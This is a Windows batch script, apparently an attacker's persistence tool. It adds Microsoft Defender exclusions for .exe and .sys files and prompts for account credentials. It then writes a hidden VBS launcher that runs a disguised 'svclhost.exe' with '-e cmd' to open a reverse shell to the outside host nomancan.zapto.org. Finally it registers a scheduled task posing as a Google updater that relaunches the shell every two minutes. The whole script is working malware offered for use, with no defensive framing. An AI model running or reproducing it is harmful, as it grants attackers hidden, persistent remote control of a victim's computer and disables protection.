@echo off & mode 16,1
powershell -Command Get-MpPreference | findstr ExclusionExtension
set /P Exclu=Add Exclusion (Y/N Default is No): 
if not defined Exclu (set Exclu=N)
if /i %Exclu%==n (goto No)
if /i %Exclu%==y (goto Yes) else (goto No)
:Yes
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension "*.exe"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension "*.sys"
:No
dir "C:\Users"

set "uname="
set "pass="
set "n_pt="

set /P uname=Enter Username: 
rem if not defined n_date (set n_date=08/11/2024)
set /P pass=Enter Password: 
rem if not defined pass (set n_time=18:41:10)
set /P n_pt=Enter New Port (4425): 
if not defined n_pt (set n_pt=4425)

echo %uname%
echo %pass%
echo %n_pt%

echo CreateObject("Wscript.Shell").Run "cmd /c C:\Windows\Temp\svclhost.exe nomancan.zapto.org %n_pt% -e cmd", 0, True > "C:\Windows\Temp\newsvclhost.vbs"

rem set tt=%time:~0,5%
SCHTASKS /CREATE /SC MINUTE /MO 2 /TN "GoogleSystem\GoogleUpdater\ChromeOnline" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\newsvclhost.vbs" /ST 02:48 /RU %uname% /RP %pass% /F
SCHTASKS /QUERY /TN "GoogleSystem\GoogleUpdater\ChromeOnline"
SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeOnline"
